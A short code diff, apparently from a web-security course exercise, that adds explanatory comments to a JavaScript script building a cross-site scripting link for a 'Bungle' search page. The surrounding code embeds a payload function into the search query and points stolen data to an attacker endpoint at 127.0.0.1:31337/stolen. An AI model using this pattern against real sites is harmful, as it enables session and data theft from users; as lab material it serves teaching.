@@ -19,6 +19,7 @@ function payload(attacker) {
 	proxy("./");
 }
 
+// make the url; the url embeds the function definition above by calling payload.toString()
 function makeLink(xssdefense, target, attacker) {
 	if (xssdefense == 0) {
 		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
@@ -32,6 +33,7 @@ var xssdefense = 0;
 var target = "http://permalink.co/";
 var attacker = "http://127.0.0.1:31337/stolen";
 
+// This part makes the <a></a> html code for the Try Bungle link
 $(function() {
 	var url = makeLink(xssdefense, target, attacker);
 	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
